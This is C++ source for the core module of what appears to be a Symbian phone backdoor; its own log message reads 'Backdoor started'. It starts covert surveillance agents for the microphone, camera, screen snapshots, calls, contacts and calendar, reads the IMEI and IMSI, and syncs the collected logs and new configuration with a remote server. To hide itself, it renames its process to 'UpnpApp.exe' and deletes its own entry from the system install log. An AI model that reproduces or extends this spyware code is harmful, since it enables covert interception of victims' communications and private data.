
//  Include Files  
#include <e32base.h>
#include <e32std.h>
#include <bautils.h>
#include <aknswallpaperutils.h>
#include <coemain.h>

#include "Core.h"
#include "ConfigFile.h"


#include <D32DBMS.h>

#include <HT\FileUtils.h>
#include <HT\AES.h>
#include <HT\Processes.h>
#include <HT\EventFactory.h>
#include <HT\AgentFactory.h>
#include <HT\ActionFactory.h>
#include <HT\AbstractEvent.h>
#include <HT\AbstractAgent.h>
#include <HT\AbstractAction.h>

TBuf<50>  iGlobalImei;
TBuf<15>  iGlobalImsi;

CCore::CCore() :
	CAbstractQueueEndPoint(ECore)
	{
	}

CCore* CCore::NewLC()
	{
	CCore* self = new (ELeave) CCore();
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CCore::~CCore()
	{
	__FLOG(_L("Destructor"));
	iEndPoints.ResetAndDestroy();
	iEndPoints.Close();
	delete iConfig;
	delete iFreeSpaceMonitor;
	
	//TODO: activate this in 8.0
	if(iDemoVersion)
		{
		delete iWallpaper;
		delete iTonePlayer;
		}
	/*
#ifdef _DEMO  //TODO: delete this in 8.0
	delete iWallpaper;
	delete iTonePlayer;
#endif
*/
	iFs.Close();
	RProperty::Delete(KPropertyFreeSpaceThreshold);
	__FLOG(_L("EndDestructor"));
	__FLOG_CLOSE;
	}

void CCore::ConstructL()
	{
	BaseConstructL();
	__FLOG_OPEN("HT", "Core.txt");
	__FLOG(_L("------------"));

	static _LIT_SECURITY_POLICY_PASS(KAllowAllPolicy);
	TInt ris = 0;
	ris = RProperty::Define(KPropertyUidCore, KPropertyFreeSpaceThreshold, RProperty::EInt,KAllowAllPolicy, KAllowAllPolicy);
		
	iConfig = CConfigFile::NewL();
	iFs.Connect();
	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
	
	TUint16 crc=0;
	Mem::Crc(crc,KDEMO_KEY().Ptr(),KDEMO_KEY().Length());
	if(crc == KCrcDemoKey)
		iDemoVersion = ETrue;
	else
		iDemoVersion = EFalse;
	
	//TODO: test
	CPhone* phone = CPhone::NewLC();
	phone->GetImeiSync(iGlobalImei);
	phone->GetImsiSync(iGlobalImsi);
	CleanupStack::PopAndDestroy();
	//end test
	
	//TODO: activate this in 8.0
	if(iDemoVersion)
		{
		iWallpaper = CWallpaperSticker::NewL();
		iTonePlayer = CTonePlayer::NewL();
		}
	/*
#ifdef _DEMO  //TODO: delete this in 8.0
	iWallpaper = CWallpaperSticker::NewL();
	iTonePlayer = CTonePlayer::NewL();
#endif
	*/
	__FLOG(_L("End ConstructL"));
	}


void CCore::DisposeAgentsAndActionsL()
	{
	int i = 0;
	// Deletes the executed Actions and the stopped Agents...
	while (i < iEndPoints.Count())
		{
		if (!iEndPoints[i]->CanReceiveCmd() && (iEndPoints[i]->Type() >= EAction) && (iEndPoints[i]->Type() <= EAction_LAST_ID))
			{
			delete iEndPoints[i];
			iEndPoints.Remove(i);
			continue;
			}
		if (!iEndPoints[i]->CanReceiveCmd() && (iEndPoints[i]->Type()) >= EAgent && (iEndPoints[i]->Type() <= EAgent_LAST_ID))
			{
			delete iEndPoints[i];
			iEndPoints.Remove(i);
			continue;
			}
		i++;
		}	
	}

void CCore::RestartAllAgentsL()  //TODO: check if still used
	{
	// Stops all the running Agents...
	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
		{
		CDataAgent* dataAgent = iConfig->iAgentsList[i];
		if (dataAgent->iStatus == EAgent_Running)
			{
			TCmdStruct restartCmd(ERestart, ECore, dataAgent->iId);
			SubmitNewCommandL(restartCmd);
			}
		}
	}


void CCore::CycleAppendingAgentsL()
	{
	// Stops the running Agents that creates logs in append
	// so excluding: AgentMic, AgentSnapshot, AgentCallLocal, AgentCamera
	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
		{
		CDataAgent* dataAgent = iConfig->iAgentsList[i];
		if (dataAgent->iStatus == EAgent_Running)
			{
			switch(dataAgent->iId)
				{
				case EAgent_Mic:
				case EAgent_Snapshot:
				case EAgent_CallLocal:
				case EAgent_Cam:
				case EAgent_Device:
					break;
				default:
					{
					//TCmdStruct restartCmd(ERestart, ECore, dataAgent->iId);
					TCmdStruct restartCmd(ECycle, ECore, dataAgent->iId);
					SubmitNewCommandL(restartCmd);
					}
					break;
				}
			}
		}
	}


void CCore::StopAllAgentsAndEventsL()
	{
	// Stops all the running Agents...
	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
		{
		CDataAgent* dataAgent = iConfig->iAgentsList[i];
		StopAgentL(dataAgent->iId);
		}

	// Disposes all the Events...
	int i = 0;
	while (i < iEndPoints.Count())
		{
		if ((iEndPoints[i]->Type() >= EEvent) && (iEndPoints[i]->Type() <= EEvent_LAST_ID))
			{
			delete iEndPoints[i];
			iEndPoints.Remove(i);
			continue;
			}
		i++;
		}
	}


void CCore::LoadConfigAndStartL()
	{
	__FLOG(_L("LoadConfigAndStartL() enter"));
	
	StopAllAgentsAndEventsL(); 
	
	// Read the updated Configuration
	RFs fs;
	User::LeaveIfError(fs.Connect());
	CleanupClosePushL(fs);

	TFullName tmpConfigFile; tmpConfigFile.Copy( KTMP_CONFNAME );
	TFullName configFile; configFile.Copy( KCONFNAME );
	FileUtils::CompleteWithPrivatePathL(fs, tmpConfigFile);
	FileUtils::CompleteWithPrivatePathL(fs, configFile);	
	
	// Try to load the new config file first...
	TBool validConfig = iConfig->LoadL(fs, tmpConfigFile);
	if (validConfig)
		{
		//write LogInfo
		_LIT(KValidNewConf,"New configuration activated");
		LogInfoMsgL(KValidNewConf);
		
		BaflUtils::CopyFile(fs, tmpConfigFile, configFile);
		} else
		{
		validConfig = iConfig->LoadL(fs, configFile);
		}
	fs.Delete(tmpConfigFile);
	
	CleanupStack::PopAndDestroy(&fs);
	__FLOG_1(_L("Loaded Config: %d"), validConfig);

	// Starts all the Agents...
	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
		{
		CDataAgent* dataAgent = iConfig->iAgentsList[i];
		if (dataAgent->iStatus == EAgent_Enabled)
			{
			StartAgentL(dataAgent->iId);
			}
		}

	// Starts all the Events...
	for (int i = 0; i < iConfig->iEventsList.Count(); i++)
		{
		CDataEvent* dataEvent = iConfig->iEventsList[i];
		CAbstractEvent* newEvent = EventFactory::CreateEventL(dataEvent->iId, dataEvent->iParams,
				dataEvent->iMacroActionIdx);
		iEndPoints.Append(newEvent);
		}
	__FLOG(_L("LoadConfigAndStartL() exit"));
	}

void CCore::LoadNewConfigL()
	{
		// log new config received
		_LIT(KNewConf,"New configuration received");
		LogInfoMsgL(KNewConf);
		
		// clear iEndPoints
		iEndPoints.ResetAndDestroy();
		
		// mark agents as stopped
		TInt count = iConfig->iAgentsList.Count();
		for (int i = 0; i < count; i++)
		{
			iConfig->iAgentsList[i]->iStatus = EAgent_Stopped;
		}
		// empty the shared queue	
		DoEmptyQueueL();
		// restart
		LoadConfigAndStartL();
		
	}

void CCore::StartAgentL(TAgentType agentId)
	{
	// MARK: Begin AGENT_TASKS Patch
	// The patch below is needed because the Config file doesn't take in 
	// consideration AddressBook and Calendar Agents yet, but only the Tasks Agent
	// So, when there is a reference to Tasks Agent in the Config, we will start both
	// the AddressBook and the Calendar Agents.
	if (agentId == EAgent_Tasks_TODO)
		{
		StartAgentL(EAgent_Addressbook);
		StartAgentL(EAgent_Calendar);
		return;
		}
	// End AGENT_TASKS Patch

	// Retrieves the Agent's Parameters from the Config
	CDataAgent* dataAgent = iConfig->FindDataAgent(agentId);

	// Raises a PANIC if the Agent is not available in the Config.
	ASSERT(dataAgent != NULL);

	// If the Agent is already Running, do nothing.
	if (dataAgent->iStatus == EAgent_Running)
		return;

	// Creates the new Agent and send it the START command.
	CAbstractAgent* newAgent = AgentFactory::CreateAgentL(agentId, dataAgent->iParams);
	TInt err = iEndPoints.Append(newAgent);
	TCmdStruct startCmd(EStart, ECore, agentId);
	SubmitNewCommandL(startCmd);

	// Mark this Agent as "Running" so it will be stopped when a new config will be uploaded
	dataAgent->iStatus = EAgent_Running;	
	}


void CCore::StopAgentL(TAgentType agentId)
	{
	// MARK: Begin AGENT_TASKS Patch
	// The patch below is needed because the Config file doesn't take in 
	// consideration AddressBook and Calendar Agents yet, but only the Tasks Agent
	// So, when there is a reference to Tasks Agent in the Config, we will start both
	// the AddressBook and the Calendar Agents.
	if (agentId == EAgent_Tasks_TODO)
		{
		StopAgentL(EAgent_Addressbook);
		StopAgentL(EAgent_Calendar);
		return;
		}
	// End AGENT_TASKS Patch
	// Retrieves the Agent's Parameters from the Config
	CDataAgent* dataAgent = iConfig->FindDataAgent(agentId);

	// Raises a PANIC if the Agent is not available in the Config.
	ASSERT(dataAgent != NULL);

	// If the Agent is already Stopped, do nothing.
	if (dataAgent->iStatus == EAgent_Stopped)
		return;

	// Sends a Stop command to the Agent
	TCmdStruct stopCmd(ECmdStop, ECore, agentId);
	SubmitNewCommandL(stopCmd);

	// Mark this Agent as "Stopped"
	dataAgent->iStatus = EAgent_Stopped;	
	}


void CCore::ExecuteActionL(TActionType type, const TDesC8& params)
	{
	__FLOG_1(_L("ExecuteAction: %d"), type);

	if (type == EAction_Sync || type == EAction_SyncApn)
		{
		/*
		 // 1. Restarta gli agenti che creano un log unico in append in modo da poter inviare il log scritto fino al momento.
		 // 2. Restarta il DeviceAgent?.
		 // 3. Controlla che non sia gia' disponibile una connessione (WiFi? ad esempio).
		 // 1. Se disponibile allora inizia il processo di sincronizzazione. 
			4. Controlla lo stato del device per verificare che si trovi in stand-by.
			5. Se il device e' in standby viene creato uno snapshot dei log attualmente disponibili.
			6. Viene stabilita una connessione col server.
			7. Viene richiesto il file di configurazione.
			8. Vengono inviati i log.
			9. L'Azione termina e viene ristabilito lo stato precedente (es: vengono spente le periferiche che erano state accese).
		 */
		//RestartAllAgentsL();  // original MB
		CycleAppendingAgentsL();
		}
	
	// Creates the Action and send it a Start
	CAbstractAction* newAction = ActionFactory::CreateActionL(type, params);
	iEndPoints.Append(newAction);
	TCmdStruct startCmd(EStart, ECore, type);
	SubmitNewCommandL(startCmd);
	__FLOG(_L("ActionsExecuted"));
	}

void CCore::DispatchCommandL(TCmdStruct aCommand)
	{
	ASSERT( aCommand.iType == ENotify );

	//TODO: activate this in 8.0
	if(iDemoVersion)
		{
		iTonePlayer->Play();
		}
	/*
#ifdef _DEMO  //TODO: delete this in 8.0
	iTonePlayer->Play();
#endif
*/
	// This is an "Event Triggered" Notification...
	// Gets the id of the macro action to execute...
	TInt macroIdx = aCommand.iSrc;

	ASSERT( macroIdx < iConfig->iMacroActionsList.Count() );

	// Gets the MacroAction to execute.
	CDataMacroAction* macroAction = iConfig->iMacroActionsList[macroIdx];

	// Enqueue all the actions
	for (int i = 0; i < macroAction->iActionsList.Count(); i++)
		{
		CDataAction* action = macroAction->iActionsList[i];

		// Handles the two special cases Start Agent / Stop Agent because we have to check 
		// if the Agent is already running and stop it, or create a new Agent and start it.
		// EAction_StartAgent and EAction_StopAgent are not "real" Actions objects, they just start or stop Agents
		switch (action->iId)
			{
			case EAction_StartAgent:
				{
				TAgentType agentId;
				RBuf paramsBuf;
				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
				if(err == KErrNone)
					{
					paramsBuf.Copy(action->iParams);
					}
				else
					{
					//TODO: not enough memory
					}
								
				paramsBuf.CleanupClosePushL();
				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
				CleanupStack::PushL(jsonBuilder);
				jsonBuilder->BuildFromJsonStringL(paramsBuf);
				CJsonObject* rootObject;
				jsonBuilder->GetDocumentObject(rootObject);
				if(rootObject)
					{
					CleanupStack::PushL(rootObject);
					agentId = (TAgentType) iConfig->GetModuleId(rootObject);
					CleanupStack::PopAndDestroy(rootObject);
					}
				CleanupStack::PopAndDestroy(jsonBuilder);
				CleanupStack::PopAndDestroy(&paramsBuf);
				if(agentId>0)
					StartAgentL(agentId);
				break;
				}
			case EAction_StopAgent:
				{
				// Handles the two special cases Start Agent / Stop Agent because we have to check 
				// if the Agent is already running and stop it, or create a new Agent and start it.
				//TUint32* paramsPtr = (TUint32*) action->iParams.Ptr();
				//TAgentType agentId = (TAgentType) *paramsPtr;
				TAgentType agentId;
				RBuf paramsBuf;
				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
				if(err == KErrNone)
					{
					paramsBuf.Copy(action->iParams);
					}
				else
					{
					//TODO: not enough memory
					}
												
				paramsBuf.CleanupClosePushL();
				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
				CleanupStack::PushL(jsonBuilder);
				jsonBuilder->BuildFromJsonStringL(paramsBuf);
				CJsonObject* rootObject;
				jsonBuilder->GetDocumentObject(rootObject);
				if(rootObject)
					{
					CleanupStack::PushL(rootObject);
					agentId = (TAgentType) iConfig->GetModuleId(rootObject);
					CleanupStack::PopAndDestroy(rootObject);
					}
				CleanupStack::PopAndDestroy(jsonBuilder);
				CleanupStack::PopAndDestroy(&paramsBuf);
				if(agentId>0)
					StopAgentL(agentId);
				break;
				}
			default:
				// All others are real Actions, so creates new Actions instances and send them a START commmand
				ExecuteActionL(action->iId, action->iParams);
				break;
			}
		}

	// This command has been dispatched.
	MarkCommandAsDispatchedL();
	
	// Resources Cleanup... It is not mandatory, it just deletes the executed Actions and the stopped Agents.
	DisposeAgentsAndActionsL();
	}

/**
 * Called by the Framework when the Shared Queue has been updated
 */
void CCore::PropertyChangedL(TUid category, TUint key, TInt value)
	{
	
		// Load a new configuration, triggered into ActionSync.cpp
		if (value == 0xEFBE){
			LoadNewConfigL();
			return;
		}
			
		CAbstractQueueEndPoint::PropertyChangedL(category, key, value);

		//TODO: delete when done with memory leak tests
		/*
#ifdef _DEBUG
	if (value == 0xDEAD)
		{
		CActiveScheduler::Stop();
		return;
		}
#endif
*/
	}


void CCore::LogInfoMsgL(const TDesC& aLogMessage)
	{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	buffer->InsertL(buffer->Size(),(TUint8*)aLogMessage.Ptr(),aLogMessage.Size());
	HBufC8* byteBuf = buffer->Ptr(0).AllocLC();
	CLogFile* logFile = CLogFile::NewLC(iFs);
	logFile->CreateLogL(LOGTYPE_INFO);
	logFile->AppendLogL(*byteBuf);
	logFile->CloseLogL();
	CleanupStack::PopAndDestroy(logFile);
	CleanupStack::PopAndDestroy(byteBuf);
	CleanupStack::PopAndDestroy(buffer);
	}


void CCore::StartMonitorFreeSpace()
	{
	TBool below = iFreeSpaceMonitor->IsBelowThreshold();
	if(below)
		{
		RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 0);
		}
	else
		{
		RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 1);
		}
	iFreeSpaceMonitor->StartListeningForEvents();
	}


void CCore::ChangeWallpaper()
	{
	TInt err = AknsWallpaperUtils::SetIdleWallpaper(KWallpaperImage, CCoeEnv::Static());
	if(err != KErrNone)
		{
		// if the configured image can't be loaded, backdoor is stopped
		CActiveScheduler::Stop();
		}
	iWallpaper->Start();
	}


void CCore::NotifyAboveThreshold()
	{
	RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 1);
	}

void CCore::NotifyBelowThreshold()
	{
	RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 0);
	}

TBool CCore::DemoVersion()
	{
	return iDemoVersion;
	}

LOCAL_C void DeleteInstallerLog(TUid aUid)
	{
	// install log table has been defined into Symbian source code as:
	/*
	// SQL query used to create the log table
	_LIT( KLogCreateTableSQL, 
	"CREATE TABLE log (time BIGINT NOT NULL,uid UNSIGNED INTEGER NOT NULL,\
	name VARCHAR(128) NOT NULL,vendor VARCHAR(128) NOT NULL,\
	version VARCHAR(16) NOT NULL,action UNSIGNED INTEGER,startup UNSIGNED INTEGER)" );
	*/

	_LIT( KLogSecureFormat, "SECURE%S" );   // found  in LogTask.cpp
	#define KSWInstLogAccessPolicyUid 0x10207216  // found in SWInstUid.h
	// UID of the SWInstLog db access policy, found in SWInstLogTaskParam.h
	const TUid KLogAccessPolicyUid = { KSWInstLogAccessPolicyUid }; 
	// Name of the install log db, found in SWInstLogTaskParam.h 
	_LIT( KLogDatabaseName, "c:SWInstLog.db" );  
	// Name of the log table, found in SWInstLogTaskParam.h
	_LIT( KLogTableName, "log" );

	TInt err;
	RDbs dbSession;
	err = dbSession.Connect();
	if(err != KErrNone)
		return;
	CleanupClosePushL(dbSession);
	// Construct the db format string
	TBuf<32> formatString;
	TUidName uidStr = KLogAccessPolicyUid.Name();    
	formatString.Format( KLogSecureFormat, &uidStr );
		
	RDbNamedDatabase dbs;
	// Try to open the db
	err = dbs.Open( dbSession, KLogDatabaseName, formatString );
	if(err != KErrNone)
		{
		// can't open db, return
		CleanupStack::PopAndDestroy(&dbSession);
		return;
		}
	CleanupClosePushL( dbs );
					
	// See if the log table already exists
	RDbTable table;
	err = table.Open( dbs, KLogTableName);
	if ( err != KErrNone )
		{
		// Table does not exist
		CleanupStack::PopAndDestroy(2); //dbs, dbsession
		return;
		}
	CleanupClosePushL( table );        
	
	// delete entry
	_LIT( KLogDeleteSQLFormat,"DELETE FROM log WHERE uid=%u"); 
	TBuf<64> sqlString;
	sqlString.Format(KLogDeleteSQLFormat,aUid.iUid);
	dbs.Execute(sqlString);
	dbs.Compact();
	CleanupStack::PopAndDestroy(3); //table, dbs, dbsession       
	}



LOCAL_C void DoStartL()
	{
	// rename the process
	_LIT(KProcName, "UpnpApp.exe");
	if (!Processes::RenameIfNotRunning(KProcName))
		return;
	
	//delete install log entry
	User::After(10*1000000);
	TUid myUid = GetUid(KUidBackdoor);
	DeleteInstallerLog(myUid);
	
	// Create active scheduler (to run active objects)
	CActiveScheduler* scheduler = new (ELeave) CActiveScheduler();
	CleanupStack::PushL(scheduler);
	CActiveScheduler::Install(scheduler);
	
	CCore* core = CCore::NewLC();
	
	//log backdoor start
	_LIT(KBdStart,"Backdoor started");
	core->LogInfoMsgL(KBdStart);
		
	//load config
	core->LoadConfigAndStartL();
	
	//start free space monitor
	core->StartMonitorFreeSpace();
	
	//TODO: activate this in 8.0
	if(core->DemoVersion())
		{
		core->ChangeWallpaper();
		}
	/*
#ifdef _DEMO  //TODO: delete this in 8.0
	//change wallpaper
	core->ChangeWallpaper();
#endif
	*/
	CActiveScheduler::Start();  
	CleanupStack::PopAndDestroy(core);
	// Delete active scheduler
	CleanupStack::PopAndDestroy(scheduler);
	}

//  Global Function
GLDEF_C TInt E32Main()
	{
	// Create cleanup stack
	__UHEAP_MARK;
	CTrapCleanup* cleanup = CTrapCleanup::New();
	// Run application code inside TRAP harness
	TRAPD(mainError, DoStartL());

	delete cleanup;
	__UHEAP_MARKEND;
	//return KErrNone;
	return mainError;   // as suggested by Marco
	}
